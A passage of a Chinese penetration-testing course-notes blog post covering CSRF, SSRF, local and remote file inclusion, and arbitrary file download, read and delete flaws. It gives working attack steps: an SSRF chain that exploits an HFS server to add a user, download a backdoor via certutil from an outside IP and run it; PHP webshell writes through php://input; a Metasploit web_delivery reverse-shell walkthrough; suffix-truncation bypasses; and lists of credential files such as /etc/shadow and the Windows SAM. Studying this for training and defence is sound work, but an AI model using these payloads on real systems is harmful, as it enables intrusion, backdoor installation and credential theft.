class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 当我访问上面这些代码构成的恶意页面，我之前正在访问的网站就会自动添加一个账户名和密码都为xiaodi的管理员账户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例2-SSRF-利用各种协议信息探针</span><br><span class="line"></span><br><span class="line">- ssrf存在的地方：核心就是加载远程连接（url）的地方，比如加载远程图片、远程网页等等</span><br><span class="line">  - 从功能上查找</span><br><span class="line">    - 分享：通过url地址分享网页内容</span><br><span class="line">    - 转码服务：通过url地址把源地址的网页内容调优使其适合收集</span><br><span class="line">    - 在线翻译：通过url地址翻译该地址对应的文本的内容，提供此功能的有百度、有道</span><br><span class="line">    - 图片加载与下载：通过url地址加载或者下载图片</span><br><span class="line">    - 图片、文章收藏功能</span><br><span class="line">    - 未公开的api实现以及其他调用url的功能</span><br><span class="line">  - 从url关键字查找</span><br><span class="line">    - share</span><br><span class="line">    - wap</span><br><span class="line">    - url</span><br><span class="line">    - link</span><br><span class="line">    - src</span><br><span class="line">    - source</span><br><span class="line">    - target</span><br><span class="line">    - u</span><br><span class="line">    - 3g</span><br><span class="line">    - display</span><br><span class="line">    - sourceURI</span><br><span class="line">    - imageURL</span><br><span class="line">    - domain</span><br><span class="line">- ssrf的验证：</span><br><span class="line">  - burpsuit抓包，看它是否请求了一个其他的url地址</span><br><span class="line">  - 右键打开图片，看图片的地址是否是一个url</span><br><span class="line">- ssrf的绕过</span><br><span class="line">  - 使用@符号，比如:http://cehshi.com@10.10.10.10   在@符号前，放上一个正常的地址，@符号后放上我们要探测的ip</span><br><span class="line">  - ip地址转换：将ip地址转换为十进制数字</span><br><span class="line">- 特点：最主要的作用是进行信息的收集，然后可以根据收集的信息，比如内网的其他机器以及其他机器运行的服务，并在网络上搜索看这些服务是否有历史漏洞，然后利用</span><br><span class="line">- 分类：</span><br><span class="line">  - 有回显：比较简单</span><br><span class="line">  - 无回显：利用复杂，后续迪哥的ctf课程会讲</span><br><span class="line">- 定义：网站a存在ssrf漏洞，我们可以通过该漏洞探测和网站a所在的服务器a下的同一个局域网下的其他机器，同时也可以读取服务器a的端口，开启的各项服务、本地的文件等等</span><br><span class="line">- ssrfSSRF漏洞(原理&amp;绕过姿势)：https://www.t00ls.net/articles-41070.html</span><br><span class="line">- ssrf的功能：端口扫描&amp;指纹识别&amp;内网探针&amp;漏洞利用等</span><br><span class="line">- ssrf案例讲解</span><br><span class="line">  - 假设网站：127.0.0.1:8081/ssrf.php  存在ssrf存在漏洞</span><br><span class="line">  - 1、首先修改请求的网址，比如加载的远程的地址，将其改为：http://127.0.0.1:8081/phpmyadmin/  这是探测对方8081端口是否开启了phpadmin</span><br><span class="line">  - 2、读取文件file:///D:/www.txt</span><br><span class="line">  - 3、探测对方是否开启了3306端口：dict://192.168.46.133:3306/info</span><br><span class="line">  - 读取对方的ftp服务器里的文件：ftp://192.168.46.133:21</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssrf不同的脚本语言支持的各种协议</span><br><span class="line"></span><br><span class="line">- ​                 ![img](https://qqadapt.qpic.cn/txdocpic/0/fa474aba6ed4a6d93fac52b4993fe7cd/0?w=440&amp;h=527)        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-SSRF-信息探针&amp;漏洞利用&amp;权限</span><br><span class="line"></span><br><span class="line">- 通过ssrf获取内网内的其他机器的权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
场景说明：网站127.0.0.1:8081/ssrf_exp.php 存在ssrf漏洞，并且在该网站所在的服务器所处的局域网内还有其他机器，我们的目标就是获取其他机器的权限1、发现了存在ssrf的网站：127.0.0.1:8081/ssrf_exp.php2、进行信息探测：    通过构造payload：http://192.168.0.1   将内网的ip段做成字典，内网ip段参考下文，如果存在该ip，并且该ssrf是回显ssrf的话，会有数据回显，此时探测到内网ip：192.168.46.133    接着进行探测端口，一样的，192.168.46.133:x   将x做成字典，然后进行探测，经过探测，发现端口8080，该端口发现了hfs服务3、根据探测到的服务，进行利用，百度搜索hfs漏洞利用，发现hfs有命令执行漏洞4、那么接下来可以利用命令执行添加一个账户和密码：http://192.168.46.133:8080//?search==%00{.exec|cmd /c net user hack 123 /add.} 5、问题来了，我们创建了账户却无法直接连接，因为192.168.46.133处于内网，所以我们无法直连，只能让该服务器反连，有两种思路：    思路一：让该内网机器下载后门，下载后，通过命令执行，让它执行后门    思路二：让虚拟机下载转发脚本，执行转发脚本转发shell出来    推荐：推荐思路一6、通过css制作后门，然后将它放到我们的服务器上，使其可以通过url下载：    后门地址：    http://47.94.236.117/mm.exe 7、通过命令执行，使内网机器下载后门    下载EXE后门：    http://192.168.46.133:8080/?search==%00{.exec|cmd.exe%20/c%20certutil%20-urlcache%20-split%20-f%20http://47.94.236.117/mm.exe.}  8、通过命令执行，让内网机器执行后门    执行EXE后门：    http://192.168.46.133:8080/?search==%00{.exec|mm.exe.} 9、上线成功
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 内网ip段</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    以下IP段的地址都是内网IP地址。（1）10.0.0.0 到 10.255.255.255（2）172.16.0.0 到172.31.255.255（3）192.168.0.0 到192.168.255.255</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>#案例4-SSRF-某实际案例测试演示(功能)</p>
<ul>
<li>SSRF漏洞(原理&amp;绕过姿势)<ul>
<li><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a></li>
</ul>
</li>
</ul>
<h2 id="29、文件包含-amp-LFI-amp-RFI-amp-协议利用"><a href="#29、文件包含-amp-LFI-amp-RFI-amp-协议利用" class="headerlink" title="29、文件包含&amp;LFI&amp;RFI&amp;协议利用"></a>29、文件包含&amp;LFI&amp;RFI&amp;协议利用</h2><p>#知识点：</p>
<ul>
<li>1、解释-什么是文件包含<ul>
<li>定义：<ul>
<li>是开发者在开发中为了一些文件和功能的复用而采用的一种方法，通过文件包含，可以提高工作效率，对于相同的功能，只需要将其写成一个模块，以后调用的时候直接包含该文件即可，而不需要每次调用都重新写大量的代码</li>
</ul>
</li>
<li>特性：<ul>
<li>被包含的文件，都会被解析，文件内容是什么格式的，就会按照什么格式解析，比如1.txt里包含php一句话木马，如果包含1.txt，它也会按照php解析</li>
</ul>
</li>
</ul>
</li>
<li>2、应用-为什么会出现包含<ul>
<li>变量名可控</li>
</ul>
</li>
<li>3、分类-本地LFI&amp;远程RFI</li>
<li>4、利用-过滤无过滤&amp;伪协议</li>
</ul>
<p>文件包含可能存在的情况：</p>
<ul>
<li>观察url里带等于号 = 后面接的是否是文件或者</li>
<li>变种文件包含：就是等于号 = 后面接的虽然是文件，但是没有带文件后缀，这样的我们很容易忽略，但是这里也可能存在文件包含的<ul>
<li>举例：127.0.0.1/index.php?page=login    <ul>
<li>这里很大概率就是包含login.php文件，之所以没有php后缀，因为它的代码是这样写的：include($_GET[‘file’].’php’)</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>文件包含的检测：</p>
<ul>
<li>将上面可能存在文件包含的一些关键字进行替换，比如url：127.0.0.1/index.php?page=login      可以将login替换成index，看页面是否有变化，有就代表此处存在文件包含</li>
</ul>
<p>不同操作系统的敏感文件的位置</p>
<ul>
<li><h4 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h4><blockquote>
<p>c:\boot.ini // 查看系统版本<br>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br>c:\windows\repair\sam // 存储Windows系统初次安装的密码<br>c:\ProgramFiles\mysql\my.ini // MySQL配置<br>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br>c:\windows\php.ini // php 配置信息</p>
</blockquote>
<h4 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h4><blockquote>
<p>/etc/passwd // 账户信息<br>/etc/shadow // 账户密码文件<br>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br>/usr/local/app/php5/lib/php.ini // PHP相关配置<br>/etc/httpd/conf/httpd.conf // Apache配置文件<br>/etc/my.conf // mysql 配置文件</p>
</blockquote>
</li>
</ul>
<p>文件包含各个脚本代码：</p>
<ul>
<li>```<br>ASP,PHP,JSP,ASPX等<!--#include file="1.asp" --><!--#include file="top.aspx" -->&lt;c:import url=”<a target="_blank" rel="noopener" href="http://thief.one/1.jsp&quot;&gt;">http://thief.one/1.jsp&quot;&gt;</a>&lt;jsp:include page=”head.jsp”/&gt;&lt;%@ include file=”head.jsp”%&gt;<?php Include('test.php')?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">本地文件包含的两类写法：LFI</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  #将包含的文件名写死include(&#x27;check.php&#x27;)    #这样将文件名写死，就不存在漏洞    #通过变量控制    $file=$_GET[&#x27;filename&#x27;];	include($file);        这种情况我们可以控制变量名来进行包含                #通过变量+指定（写死）后缀控制         $file=$GET[&#x27;filename&#x27;];		include($_GET[&#x27;file&#x27;].&#x27;php&#x27;)         这种情况因为写死了后缀，如果我们继续包含1.txt,那么组合成的文件就是1.txt.php，这样肯定会包含失败，因为不存在该文件，所以我们只能通过截断或者注释的方法来进行绕过          绕过：基于php低版本            	1、直接通过 %00 来进行截断            	需要前提：            			magic_quotes_gpc = Off					   PHP版本&lt; 5.3.4            http://127.0.0.1:8081/include.php?filename=1.txt%00				2、通过构造payload长度来挤掉后门的php后缀，因为url的长度是有限制的，当超过一定的长度，就会导致后面的拼接的代码拼接不上去，从而绕过代码里强制添加的php后缀，我们可以通过 ../   来构造长度                    http://127.0.0.1:8081/include.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././		绕过：基于php高版本：使用伪协议进行绕过            data://text/plain,&lt;?php%20phpinfo();?&gt;                                </span><br></pre></td></tr></table></figure></li>
</ul>
<p>#案例2-RFI-远程文件包含代码测试</p>
<ul>
<li>```php<br>1、无过滤情况，直接包含    <a target="_blank" rel="noopener" href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt2%E3%80%81%E5%A6%82%E6%9E%9C%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E6%AF%94%E5%A6%82%E7%B1%BB%E4%BC%BC%E4%BA%8E%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%B8%80%E6%A0%B7%EF%BC%8C%E5%86%99%E6%AD%BB%E4%BA%86%E5%90%8E%E7%BC%80%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%88include($_GET%5B&#39;file&#39;].&#39;php&#39;)%EF%BC%89%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8B%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt2、如果过滤了，比如类似于上面的本地包含一样，写死了后缀的情况下（include($_GET[&#39;file&#39;].&#39;php&#39;)），可以通过以下方法绕过</a>    <a target="_blank" rel="noopener" href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%00">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%00</a>        #这里的%23代表 #    <a target="_blank" rel="noopener" href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%23">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%23</a>    #这里的问号 ？ 代表着将源代码里写死的php后缀当作参数    <a target="_blank" rel="noopener" href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt?%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%EF%BC%9A%E8%AF%AD%E8%A8%80%E8%AE%BE%E7%BD%AE%E9%87%8C%E9%9D%A2%E6%88%96%E4%BB%A3%E7%A0%81%E9%99%90%E5%88%B6%E4%BC%9A%E5%AF%BC%E8%87%B4%E8%BF%99%E4%B8%AA%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E7%A6%81%E7%94%A8%EF%BC%8C%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E6%B5%8B%E8%AF%95%E5%8D%B3%E5%8F%AF%EF%BC%81">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt?注意事项：语言设置里面或代码限制会导致这个远程包含禁用，在实战中测试即可！</a>    allow_url_fopen = On（是否允许打开远程文件）    allow_url_include = On（是否允许include/require远程文件）通过从PHP study Pro中的php配置文件来看，此项默认是off。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-协议-各种协议提交包含测试</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  文件读取：如果不知道文件地址，可以读取当前页面下的php文件php://filter/convert.base64-encode/resource=1.txt     推荐这一种，这个不需要绝对路径file:///D:/phpstudy/PHPTutorial/WWW/1.txt        这种需要绝对路径RCE执行方法一：1、在url地址栏上拼接：php://input2、在hackbar的Post上输入:&lt;?php system(&#x27;ver&#x27;)?&gt;     不同的操作系统，系统命令不同，需要根据实际情况更换不同的命令    通过input命令执行写入shell：&lt;?PHP fputs(fopen(&#x27;s.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;    RCE命令执行方法二：    直接拼接在url上：data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>#案例4-拓展-LFI实例CMS&amp;RFI结合MSF</p>
<ul>
<li>```php<br>#ekucms包含日志getshell基本原理：该cms有文件包含漏洞，当我们构造一个payload会在它的日志下有记录，所以我们完全可以访问该url，构造一个一句话木马，然后使用文件包含漏洞包含它的日志文件，即可成功流程：想办法包含文件-文件来源（能不能上传）不能上传：包含系统自身文件渗透，包含日志文件渗透能上传：吃西瓜#RFI结合MSF-exploit/multi/script/web_delivery基本原理：通过在msf上生成一个可以反弹shell的马，然后将该马通过文件包含的RCE    命令如下：        1、msfconsole        2、use exploit/multi/script/web_delivery   后面接收模块        3、show targets         4、set 1         这是选择php        5、set target 1        6、set payload php/meterpreter_reverse_tcp        7、show options        8、set lhost 192.168.127.189        9、exploit -j         10、接着会输出一串信息            php -d allow_url_fopen=true -r “eval(file_get_contents(‘<a target="_blank" rel="noopener" href="http://43.128.27.189.8080/ZBWTxbRMsD1CP&quot;">http://43.128.27.189.8080/ZBWTxbRMsD1CP&quot;</a>            我们只需要获取到双引号里面的内容即可，但是这个payload显示不全，所以需要给他补全            <?php eval(file_get_contents('http://43.128.27.189.8080/ZBWTxbRMsD1CP"));?>        20、接下来就通过在浏览器url后面拼接 php://input  ,并且postpayload，msf那里就可反弹shell            <?php eval(file_get_contents('http://43.128.27.189.8080/ZBWTxbRMsD1CP"));?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">\#案例5-CTF-初中级比赛真题包含考点</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  [ACTF2020 新生赛]Includehttps://buuoj.cn/challengesI春秋“百度杯”CTF比赛 2017 二月场 50 includehttps://www.ichunqiu.com/battalion?t=1&amp;r=57475</span><br></pre></td></tr></table></figure></li>
</ul>
<p>文件包含php的各种伪协议及其适用版本：</p>
<ul>
<li><img src="https://qqadapt.qpic.cn/txdocpic/0/3ce53a8a61da628bf2e3f6d60889a9a5/0?w=889&h=328" alt="img">        </li>
</ul>
<p>各个脚本语言所支持的伪协议</p>
<ul>
<li><img src="https://qqadapt.qpic.cn/txdocpic/0/fa474aba6ed4a6d93fac52b4993fe7cd/0?w=440&h=527" alt="img">        </li>
</ul>
<h2 id="30、文件下载-amp-文件读取-amp-文件删除安全"><a href="#30、文件下载-amp-文件读取-amp-文件删除安全" class="headerlink" title="30、文件下载&amp;文件读取&amp;文件删除安全"></a>30、文件下载&amp;文件读取&amp;文件删除安全</h2><p>#知识点：</p>
<p>1、文件下载&amp;文件读取&amp;文件删除</p>
<p>2、原理&amp;应用&amp;检测利用&amp;赛题或CMS</p>
<p>#详细点：</p>
<p>文件下载</p>
<ul>
<li><p>观察url里是否有变量+文件名的情况，如果有，尝试更换文件名，看能否下载其他文件</p>
</li>
<li><p>技巧</p>
<ul>
<li>有时候明明是一个下载的页面，但是打开后却提示页面找不到，那么我们可以尝试将get请求换成post请求即可下载</li>
</ul>
</li>
<li><p>常规下载URL：<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/upload/123.pdf">http://www.xiaodi8.com/upload/123.pdf</a></p>
</li>
<li><p>可能存在安全URL：<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/xx.xx?file=123.pdf">http://www.xiaodi8.com/xx.xx?file=123.pdf</a></p>
</li>
<li><p>利用：常规下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息）</p>
</li>
</ul>
<p>文件读取</p>
<ul>
<li>目录遍历：文件和文件夹暴露<ul>
<li>原因：目录权限或设置有问题</li>
</ul>
</li>
<li>读取类似下载 读取文件内容 小米路由器演示</li>
<li>利用：常规读取敏感文件（数据库配置，中间件配置，系统密匙等文件信息）</li>
</ul>
<p>文件删除</p>
<ul>
<li>可能存在安全问题：<ul>
<li>前台或后台有删除功能应用，必须网站有删除的功能，才有可能发生任意文件下载</li>
</ul>
</li>
<li>利用：常规删除重装锁定配合程序重装或高危操作<ul>
<li>一般是删除install/install_lock.txt ,删除后，再次访问install目录，就会提示重装网站，这是我们完全可以使网站连接我们自己的数据库，然后拿下服务器权限</li>
</ul>
</li>
</ul>
<p>黑盒：以上文件包含，下载，删除，读取等安全漏洞，</p>
<ul>
<li>基本都是通过观察参数名传输，来尝试修改的参数值测试是否存在这类安全问题</li>
</ul>
<p>#案例1-文件下载-某博客自定义文件下载</p>
<ul>
<li>疑问：如果下载的参数被加密了怎么办？<ul>
<li>1、将参数解密，比如base解码</li>
<li>2、构造需要下载的其他文件</li>
<li>3、将构造的文件名进行base64编码</li>
<li>4、将编码后的文件名拼接到参数那里进行尝试下载</li>
<li><img src="/source/images/image-20210807170941944.png" alt="image-20210807170941944"></li>
</ul>
</li>
</ul>
<p>#案例2-文件读取-小米路由器任意文件读取</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></li>
</ul>
<p>#案例3-文件删除-海洋影视后台任意文件删除</p>
<ul>
<li>后台任意文件删除配合重装-<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3805">https://xz.aliyun.com/t/3805</a></li>
</ul>
<p>#案例4-CTF赛题-[RoarCTF 2019]EasyJava复现</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java">https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java</a></p>
</li>
<li><p>必备知识点：java的敏感目录是WEB-INF，所以碰到文件读取或下载，我们可以尝试下载/WEB-INF/web.xml</p>
</li>
<li><p>WEB-INF主要包含一下文件或目录:</p>
<ul>
<li>/WEB-INF/web.xml：<ul>
<li>Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则，里面有很多文件都是用点 ‘.’  来进行连接的，点 ‘.’  类似于目录的斜杠 /  </li>
</ul>
</li>
<li>/WEB-INF/classes/：<ul>
<li>含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中，需要结合web.xml里获取到的源代码文件，将里面的点 ‘.’ 换成斜杠 /  然后拼接到/WEB-INF/classes/ 后面，后缀是class，然后通过文件下载或读取获取内容，获取到内容，然后适用IDEA里即可自动进行反编译<ul>
<li><img src="/source/images/image-20210807170305564.png" alt="image-20210807170305564"></li>
<li><img src="/source/images/image-20210807170355415.png" alt="image-20210807170355415"></li>
<li><img src="/source/images/image-20210807170515806.png" alt="image-20210807170515806"></li>
</ul>
</li>
</ul>
</li>
<li>/WEB-INF/lib/：<ul>
<li>存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
</ul>
</li>
<li>/WEB-INF/src/：<ul>
<li>源码目录，按照包名结构放置各个java文件。</li>
</ul>
</li>
<li>/WEB-INF/database.properties：<ul>
<li>数据库配置文件</li>
</ul>
</li>
</ul>
</li>
<li><p>漏洞检测以及利用方法：</p>
<ul>
<li>下载漏洞-配置文件-获取文件架构-下载后反编译源码</li>
<li>通过找到web.xml文件，推断class文件的路径，</li>
<li>最后直接class文件，在通过反编译class文件，得到网站源码获取flag</li>
</ul>
</li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/08/10/21-25%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" rel="prev" title="21-25、渗透测试(xiaodi)">
      <i class="fa fa-chevron-left"></i> 21-25、渗透测试(xiaodi)
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/08/10/31-35%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" rel="next" title="31-35、渗透测试(xiaodi)">
      31-35、渗透测试(xiaodi) <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#28%E3%80%81CSRF-amp-SSRF%E5%8D%8F%E8%AE%AE-amp-%E5%86%85%E7%BD%91%E6%8E%A2%E9%92%88-amp-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">28、CSRF&amp;SSRF协议&amp;内网探针&amp;漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#29%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-amp-LFI-amp-RFI-amp-%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">29、文件包含&amp;LFI&amp;RFI&amp;协议利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows%EF%BC%9A"><span class="nav-number">2.0.1.</span> <span class="nav-text">Windows：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%EF%BC%9A"><span class="nav-number">2.0.2.</span> <span class="nav-text">Linux：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#30%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-amp-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-amp-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%AE%89%E5%85%A8"><span class="nav-number">3.</span> <span class="nav-text">30、文件下载&amp;文件读取&amp;文件删除安全</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="painter"
      src="/images/%E5%A4%B4%E5%83%8F.jpg">
  <p class="site-author-name" itemprop="name">painter</p>
  <div class="site-description" itemprop="description">painter的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://lishang520.github.io/" title="GitHub → https:&#x2F;&#x2F;lishang520.github.io&#x2F;"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">painter安全技术博客</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">279k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:14</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '58W9BPsri2U8s70HBxhy6tS6-gzGzoHsz',
      appKey     : 'XsON9yD3oGzDCQskxtiPhGFj',
      placeholder: "ヾﾉ≧∀≦)o快来评论一下吧!",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
